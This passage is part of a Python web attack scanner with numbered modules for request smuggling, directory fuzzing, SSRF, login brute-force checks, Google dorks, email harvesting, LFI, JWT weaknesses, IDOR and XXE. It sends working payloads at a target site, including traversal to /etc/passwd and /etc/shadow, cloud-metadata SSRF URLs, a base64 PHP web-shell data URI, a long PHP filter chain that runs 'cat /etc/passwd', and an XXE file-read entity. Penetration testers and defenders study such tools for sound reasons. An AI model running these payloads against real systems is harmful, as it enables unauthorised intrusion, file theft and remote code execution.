        (r"(?:private_key|private-key)\s*[:=]\s*['\"]([^'\"]{10,})['\"]",       "Private Key"),
    ]
    inline = re.findall(r"<script[^>]*>(.*?)</script>", body, re.DOTALL|re.IGNORECASE)
    sources = [(base+"[inline]", s) for s in inline[:5]]
    for js_url in js_files:
        _, jsbody, _ = fetch(js_url, timeout=8)
        if jsbody: sources.append((js_url, jsbody))
    found = 0
    for src_name, src_body in sources:
        for pattern, label in secret_patterns:
            for match in re.findall(pattern, src_body, re.IGNORECASE)[:2]:
                val = match if isinstance(match,str) else (match[0] if match else "")
                if len(val) < 6: continue
                bad(f"{label} in {DIM}{src_name}{RESET}: {Y}{val[:8]}...{RESET}")
                finding("CRITICAL","JSSecrets",f"{label} exposed: {src_name}")
                found += 1
    if not found:
        ok(f"No secrets found in {len(sources)} JS sources")

# ==============================================================================
#  MODULE 17 -- HTTP Request Smuggling
# ==============================================================================
def check_smuggling(base):
    head("[17] HTTP Request Smuggling")
    hostname = hostname_of(base)
    probe = (
        "POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    try:
        if base.startswith("https"):
            sock = CTX.wrap_socket(
                socket.create_connection((hostname, 443), timeout=5),
                server_hostname=hostname)
        else:
            sock = socket.create_connection((hostname, 80), timeout=5)
        sock.sendall(probe.encode())
        resp = b""
        sock.settimeout(3)
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk: break
                resp += chunk
        except Exception:
            pass
        sock.close()
        resp_str = resp.decode("utf-8","replace")
        first    = resp_str[:20]
        if "400" in first:
            warn("Server returned 400 on CL.TE probe")
        elif "200" in first or "301" in first:
            warn("Server accepted CL.TE ambiguous request -- manual smuggling test recommended")
            finding("MEDIUM","Smuggling","Possible HTTP smuggling -- manual verify")
        else:
            ok("No obvious CL.TE smuggling indicator")
    except Exception as e:
        dim(f"Smuggling probe failed: {e}")
    info("Full testing: github.com/defparam/smuggler")

# ==============================================================================
#  MODULE 18 -- Directory Fuzzing
# ==============================================================================
def check_dirfuzz(base):
    head("[18] Directory Fuzzing")
    wordlist = [
        "uploads","upload","files","images","img","media","static","assets",
        "css","js","fonts","data","docs","documents","downloads",
        "backup","backups","old","archive","temp","tmp","cache",
        "wp-content","wp-includes","wp-admin","wp-json",
        "administrator","components","modules","plugins","themes","templates",
        "vendor","node_modules","public","private","includes","lib",
        "src","dist","build","out",
        "api","rest","service","graphql","v1","v2","v3","internal",
        "admin","manage","manager","panel","console","dashboard",
        "config","conf","settings","setup","install",
        "login","auth","oauth","sso","register",
        "status","health","metrics","monitor","logs","debug",
        "test","tests","dev","development","staging","demo","sample",
        ".git","cgi-bin","cgi","bin","scripts","shell","cmd",
    ]
    found = []
    def probe(d):
        code, hdrs = hd(f"{base}/{d}", timeout=4)
        return d, code, hdrs
    info(f"Fuzzing {len(wordlist)} paths...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for d, code, hdrs in ex.map(probe, wordlist):
            if code == 200:
                ct = hdrs.get("Content-Type","") if hdrs else ""
                bad(f"/{d}  HTTP 200  {DIM}{ct}{RESET}")
                found.append(d)
                finding("MEDIUM","DirFuzz",f"Exposed: /{d}")
            elif code == 403:
                warn(f"/{d}  HTTP 403  (exists)")
                found.append(d)
    if not found:
        ok("No additional directories found")
    return found

# ==============================================================================
#  MODULE 19 -- SSRF Probe
# ==============================================================================
def check_ssrf(base):
    head("[19] SSRF Probe")
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "file:///etc/passwd",
        "http://0.0.0.0/",
    ]
    params = ["url","uri","path","src","source","dest","target","load",
              "fetch","get","download","file","link","redirect","open"]
    for param in params[:5]:
        for payload in payloads[:4]:
            url   = f"{base}/?{param}={urllib.parse.quote(payload)}"
            code, body, _ = fetch(url, timeout=7)
            body_l = body.lower()
            if any(sig in body_l for sig in
                   ["ami-id","instance-id","local-ipv4","root:x:0",
                    "computemetadata","iam/security"]):
                crit(f"SSRF confirmed! Internal data via ?{param}={payload}")
                finding("CRITICAL","SSRF",f"SSRF via '{param}'")
                return
    ok("No obvious SSRF indicators found")

# ==============================================================================
#  MODULE 20 -- Clickjacking
# ==============================================================================
def check_clickjacking(base):
    head("[20] Clickjacking")
    code, body, hdrs = fetch(base)
    if not hdrs:
        warn("Could not check"); return
    xfo = hdrs.get("X-Frame-Options","")
    csp = hdrs.get("Content-Security-Policy","")
    if not xfo and "frame-ancestors" not in csp.lower():
        bad("No X-Frame-Options + no CSP frame-ancestors -- clickjacking possible!")
        finding("MEDIUM","Clickjacking","No framing protection")
        dim(f"PoC: <iframe src='{base}' width='800' height='600'></iframe>")
    elif xfo:
        ok(f"X-Frame-Options: {xfo}")
    elif "frame-ancestors" in csp.lower():
        ok("CSP frame-ancestors present")

# ==============================================================================
#  MODULE 21 -- Authentication Checks
# ==============================================================================
def check_auth(base):
    head("[21] Authentication Checks")
    login_paths = ["/wp-login.php","/admin/login","/login","/auth/login",
                   "/administrator/","/user/login","/account/login","/signin"]
    found_login = None
    for path in login_paths:
        code, _ = hd(base+path, timeout=5)
        if code in (200,302):
            found_login = base+path
            info(f"Login page found: {path}")
            break
    if found_login:
        _, body, _ = fetch(found_login)
        if "<form" in body.lower():
            info("Login form detected -- checking rate limiting...")
            responses = set()
            for _ in range(5):
                code, _, _ = fetch(
                    found_login, method="POST",
                    data="username=admin&password=wrongpassword123",
                    extra_headers={"Content-Type":"application/x-www-form-urlencoded"})
                responses.add(code)
            if 429 in responses:
                ok("Rate limiting active (429 received)")
            else:
                warn("No rate limiting detected -- brute force may be possible")
                finding("MEDIUM","Auth","No rate limiting on login")
    code, _, hdrs = fetch(base+"/admin", timeout=5)
    if hdrs and hdrs.get("WWW-Authenticate",""):
        auth = hdrs.get("WWW-Authenticate","")
        if "basic" in auth.lower():
            warn("HTTP Basic Auth in use -- credentials sent as base64")
            finding("MEDIUM","Auth","HTTP Basic Auth")
    else:
        info("No HTTP Basic Auth on /admin")

# ==============================================================================
#  MODULE 22 -- ASN & IP Reputation
# ==============================================================================
def check_ip_reputation(base):
    head("[22] ASN & IP Reputation")
    hostname = hostname_of(base)
    try:
        ip = socket.gethostbyname(hostname)
        ok(f"Resolved IP: {ip}")
        try:
            addr = ipaddress.ip_address(ip)
            if addr.is_private:
                warn("IP is in private range -- possibly internal/behind proxy")
            if addr.is_loopback:
                warn("IP resolves to loopback")
        except Exception:
            pass
        info("Looking up ASN/org info via ipinfo.io...")
        code, body, _ = fetch(f"https://ipinfo.io/{ip}/json", timeout=8)
        if code == 200:
            data     = json.loads(body)
            org      = data.get("org","?")
            country  = data.get("country","?")
            city     = data.get("city","?")
            region   = data.get("region","?")
            rdns     = data.get("hostname","?")
            ok(f"Org      : {org}")
            ok(f"Location : {city}, {region}, {country}")
            ok(f"rDNS     : {rdns}")
            finding("INFO","IPReputation",f"{ip} -> {org} ({country})")
            vps_orgs = ["digitalocean","linode","vultr","ovh","choopa",
                        "frantech","psychz","sharktech","as14061"]
            if any(s in org.lower() for s in vps_orgs):
                warn(f"Hosted on VPS/bulletproof provider: {org}")
                finding("LOW","IPReputation",f"VPS provider: {org}")
        info(f"AbuseIPDB  : https://www.abuseipdb.com/check/{ip}")
        info(f"Shodan     : https://www.shodan.io/host/{ip}")
        info(f"VirusTotal : https://www.virustotal.com/gui/ip-address/{ip}")
    except Exception as e:
        warn(f"IP reputation check failed: {e}")

# ==============================================================================
#  MODULE 23 -- Google Dork Generator
# ==============================================================================
def check_dorks(base):
    head("[23] Google Dork Generator")
    hostname = hostname_of(base)
    root     = root_domain(hostname)
    dorks = [
        (f"site:{root} ext:php inurl:?",                    "PHP pages with parameters"),
        (f"site:{root} ext:php inurl:page=",                "PHP LFI candidates"),
        (f"site:{root} ext:php inurl:file=",                "PHP file inclusion candidates"),
        (f"site:{root} ext:php inurl:path=",                "PHP path parameters"),
        (f"site:{root} inurl:admin",                        "Admin panels"),
        (f"site:{root} inurl:login",                        "Login pages"),
        (f"site:{root} inurl:upload",                       "Upload endpoints"),
        (f"site:{root} ext:log",                            "Exposed log files"),
        (f"site:{root} ext:sql",                            "Exposed SQL dumps"),
        (f"site:{root} ext:bak OR ext:old OR ext:backup",   "Backup files"),
        (f"site:{root} ext:config OR ext:yml OR ext:conf",  "Config files"),
        (f"site:{root} intitle:\"index of\"",               "Open directory listings"),
        (f"site:{root} intext:\"sql syntax\"",              "SQL error pages"),
        (f"site:{root} intext:\"Warning: mysql\"",          "MySQL errors"),
        (f"site:{root} intext:\"Fatal error\"",             "PHP fatal errors"),
        (f"site:{root} ext:env",                            ".env files"),
        (f"site:{root} inurl:wp-content",                   "WordPress content"),
        (f"site:{root} inurl:phpinfo",                      "phpinfo pages"),
        (f"site:{root} intext:\"index of /\" \"parent directory\"", "Directory listings"),
        (f"\"{root}\" filetype:pdf confidential",           "Confidential PDFs"),
    ]
    print(f"\n  {BOLD}Google dorks for {root}:{RESET}")
    print(f"  {DIM}Copy into Google or use: https://google.com/search?q=DORK{RESET}\n")
    for dork, desc in dorks:
        print(f"  {Y}[dork]{RESET} {desc}")
        dim(dork)
        print()
    finding("INFO","Dorks",f"Generated {len(dorks)} dorks for {root}")

# ==============================================================================
#  MODULE 24 -- Email Harvesting
# ==============================================================================
def check_emails(base):
    head("[24] Email Harvesting")
    emails_found  = set()
    pages         = [base, base+"/contact", base+"/about", base+"/team",
                     base+"/contact-us", base+"/about-us", base+"/staff",
                     base+"/people", base+"/support"]
    email_pattern = r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}"
    for page in pages:
        code, body, _ = fetch(page, timeout=8)
        if code and code < 400 and body:
            for e in re.findall(email_pattern, body):
                if not any(skip in e.lower() for skip in
                           ["example.com","w3.org","schema.org","jquery"]):
                    emails_found.add(e.lower())
    if emails_found:
        for email in sorted(emails_found):
            ok(email)
            finding("INFO","Emails","Email: {email}")
        info(f"Total: {len(emails_found)} address(es) harvested")
    else:
        info("No email addresses found on common pages")

# ==============================================================================
#  MODULE 25 -- LFI / Path Traversal + PHP Filter Chain
# ==============================================================================
def check_lfi(base):
    head("[25] LFI / Path Traversal + PHP Filter Chain")

    # Top 40 LFI parameters
    lfi_params = [
        "page","file","path","include","template","view","load","doc",
        "document","folder","root","pg","style","pdf","read","content",
        "module","conf","dir","layout","inc","locate","show","site",
        "type","action","cat","category","item","topic","lang","locale",
        "language","section","chapter","url","source","data","ref","feed",
    ]

    traversal_payloads = [
        "../../../etc/passwd",
	"../../../../../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
	"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&_=cat ../../../../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ]

    # PHP Filter Chain payloads for source disclosure / RCE path
    php_filter_chains = [
        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
        "convert.iconv.UTF8.UTF7/resource=",
        "php://filter/zlib.deflate|convert.base64-encode/resource=",
        "php://filter/read=convert.base64-encode/resource=",
        "php://filter/convert.base64-encode|convert.base64-decode/resource=",
	"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&_=cat ../../../../../../../etc/passwd",
    ]

    lfi_indicators = [
        "root:x:0:0",
        "[fonts]",
        "daemon:x:",
        "HTTP_USER_AGENT",
        "DocumentRoot",
        "<?php",
    ]

    b64_re   = re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$", re.MULTILINE)
    found_lfi = False
    found_param = lfi_params[0]

    info(f"Testing {len(lfi_params)} params x {len(traversal_payloads)} payloads...")

    for param in lfi_params:
        if found_lfi:
            break
        for payload in traversal_payloads:
            url = f"{base}/?{param}={urllib.parse.quote(payload)}"
            code, body, hdrs = fetch(url, timeout=9)
            if not body or code in (None, 404):
                continue
            if any(ind in body for ind in lfi_indicators):
                bad(f"LFI confirmed! param={param} payload={payload[:50]}")
                finding("CRITICAL","LFI",f"LFI via ?{param}= payload={payload[:40]}")
                for ind in lfi_indicators:
                    if ind in body:
                        idx = body.index(ind)
                        dim(f"Snippet: ...{body[max(0,idx-20):idx+60]}...")
                        break
                found_lfi  = True
                found_param = param
                break
            if "php://filter" in payload:
                m = b64_re.search(body)
                if m:
                    warn(f"PHP filter response on param={param} -- base64 data returned")
                    finding("HIGH","LFI",f"PHP filter chain response via ?{param}=")
                    try:
                        decoded = base64.b64decode(m.group() + "==").decode("utf-8","replace")
                        if "<?php" in decoded or "root:x" in decoded:
                            bad("Source/file disclosed via PHP filter!")
                            finding("CRITICAL","LFI",f"Source disclosure via PHP filter: ?{param}=")
                            dim(f"Decoded preview: {decoded[:150]}")
                    except Exception:
                        pass
                    found_lfi  = True
                    found_param = param
                    break

    print(f"\n  {BOLD}PHP Filter Chain RCE vectors:{RESET}")
    if found_lfi:
        bad("LFI found -- PHP Filter Chain RCE may be possible!")
        finding("CRITICAL","LFI","PHP filter chain RCE candidate")
        for chain in php_filter_chains[:2]:
            dim(f"Try: ?{found_param}={chain}index.php")
        info("Generator: github.com/synacktiv/php_filter_chain_generator")
        info("Usage: python3 php_filter_chain_generator.py --chain '<?php system($_GET[cmd]);?>'")
    else:
        ok("No LFI indicators detected in tested parameters")
        info("Manual testing recommended with full wordlists")
        dim("Tool: github.com/synacktiv/php_filter_chain_generator")

# ==============================================================================
#  MODULE 26 -- JWT Weakness Checker
# ==============================================================================
def check_jwt(base):
    head("[26] JWT Weakness Checker")
    jwt_pattern = r"eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]*"
    _, _, hdrs  = fetch(base)
    hdr_str     = str(hdrs) if hdrs else ""
    jwts_found  = re.findall(jwt_pattern, hdr_str)
    for path in ["/api/token","/api/auth","/auth/token","/login"]:
        code, body, bhdrs = fetch(base+path)
        if body:
            jwts_found += re.findall(jwt_pattern, body)
        if bhdrs:
            jwts_found += re.findall(jwt_pattern, str(bhdrs))
    jwts_found = list(set(jwts_found))
    if not jwts_found:
        info("No JWTs found in headers/responses on common endpoints")
        info("Check manually after authenticating")
        return
    for jwt in jwts_found[:3]:
        info(f"JWT found: {jwt[:40]}...")
        parts = jwt.split(".")
        if len(parts) != 3:
            continue
        try:
            hdr_pad = parts[0] + "=="
            hdr_dec = base64.urlsafe_b64decode(hdr_pad).decode("utf-8","replace")
            hdr_j   = json.loads(hdr_dec)
            alg     = hdr_j.get("alg","?")
            ok(f"  Algorithm : {alg}")
            if alg.lower() == "none":
                crit("  alg=none -- token not signed! Auth bypass possible!")
                finding("CRITICAL","JWT","alg=none -- signature bypass")
            elif alg.lower() in ("hs256","hs384","hs512"):
                warn(f"  HMAC symmetric ({alg}) -- test weak secret")
                finding("MEDIUM","JWT",f"Symmetric {alg} -- brute-force candidate")
                dim("  hashcat -a 0 -m 16500 <jwt> rockyou.txt")
                dim("  github.com/ticarpi/jwt_tool")
            elif alg.lower().startswith("rs"):
                ok(f"  RSA signing ({alg})")
                warn("  Test RS->HS confusion: jwt_tool TOKEN -X k -pk public.pem")
            pay_pad = parts[1] + "=="
            pay_dec = base64.urlsafe_b64decode(pay_pad).decode("utf-8","replace")
            pay_j   = json.loads(pay_dec)
            ok(f"  Payload   : {str(pay_j)[:150]}")
            exp = pay_j.get("exp")
            if exp:
                exp_dt    = datetime.utcfromtimestamp(exp)
                remaining = (exp_dt - datetime.utcnow()).total_seconds() / 3600
                if exp_dt < datetime.utcnow():
                    warn("  Token EXPIRED -- test if server still accepts it")
                    finding("MEDIUM","JWT","Expired token -- test server acceptance")
                else:
                    ok(f"  Expires in {remaining:.1f} hours")
            else:
                warn("  No 'exp' claim -- token never expires!")
                finding("HIGH","JWT","No expiry claim in JWT")
        except Exception as e:
            dim(f"  Could not decode JWT: {e}")

# ==============================================================================
#  MODULE 27 -- IDOR Probe
# ==============================================================================
def check_idor(base):
    head("[27] IDOR Probe")
    code, body, _ = fetch(base)
    if not body:
        warn("Could not probe IDOR"); return
    url_pattern = re.compile(
        r"href=[\"']([^\"']*(?:id|user|account|order|invoice|doc|file|item)"
        r"[=/_](\d+)[^\"']*)[\"']", re.IGNORECASE)
    found_urls = url_pattern.findall(body)
    idor_params = ["id","user_id","account","uid","userid","user","profile",
                   "order","order_id","invoice","doc","file","item","pid",
                   "customer","client","member","record","ref"]
    if found_urls:
        info(f"Found {len(found_urls)} URLs with numeric IDs -- testing IDOR...")
        for url_path, num_id in found_urls[:5]:
            full_url = url_path if url_path.startswith("http") else base+url_path
            try:
                base_id = int(num_id)
            except Exception:
                continue
            for test_id in [base_id-1, base_id+1, 1, 0]:
                test_url = re.sub(
                    r"((?:id|user|account|order|invoice|doc|file|item)[=/_])" + num_id,
                    r"\g<1>" + str(test_id), full_url)
                if test_url == full_url:
                    continue
                code2, body2, _ = fetch(test_url, timeout=7)
                if code2 == 200 and len(body2) > 100:
                    code_orig, body_orig, _ = fetch(full_url, timeout=7)
                    if abs(len(body2) - len(body_orig)) > 50:
                        warn(f"IDOR candidate: {test_url}")
                        dim(f"  orig({base_id})={len(body_orig)}b  "
                            f"test({test_id})={len(body2)}b")
                        finding("HIGH","IDOR",f"IDOR candidate: {test_url}")
                    break
    else:
        info("No numeric ID patterns found -- testing common params...")
        for param in idor_params[:8]:
            for test_id in [1, 2, 0]:
                url = f"{base}/?{param}={test_id}"
                code, body2, _ = fetch(url, timeout=6)
                if code == 200 and len(body2) > 200:
                    dim(f"?{param}={test_id} -> HTTP 200 ({len(body2)} bytes) -- check manually")
                    break
    ok("IDOR probe complete -- manual verification recommended for flagged URLs")

# ==============================================================================
#  MODULE 28 -- XXE Detection
# ==============================================================================
def check_xxe(base):
    head("[28] XXE Detection")
    xxe_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<root><data>&xxe;</data></root>'
    )
    xml_endpoints = ["/api/","/api/v1/","/api/v2/","/soap/","/ws/",
                     "/service/","/upload","/import","/parse","/process"]
    found_xml = False
    for path in xml_endpoints:
        url = base + path
        code, _, hdrs = hd(url, timeout=5)
        if code and code < 404:
            found_xml = True
            info(f"Potential XML endpoint: {path}")
            code2, body2, _ = fetch(
                url, method="POST", data=xxe_payload,
                extra_headers={"Content-Type":"application/xml"})
            body_l = body2.lower()
            if any(ind in body2 for ind in ["root:x:0","daemon:x:","nobody:x:"]):
                crit(f"XXE confirmed! /etc/passwd returned at {path}")
                finding("CRITICAL","XXE",f"XXE at {path}")
                return
            if "xml" in body_l and ("error" in body_l or "parse" in body_l):
                warn(f"XML parsing error at {path} -- endpoint accepts XML")
                finding("MEDIUM","XXE",f"XML endpoint found: {path}")
    if not found_xml:
        info("No obvious XML endpoints found")
    dim("Payloads ref: github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection")

# ==============================================================================
#  REPORTS
# ==============================================================================
def save_html_report(host, elapsed, modules_run):
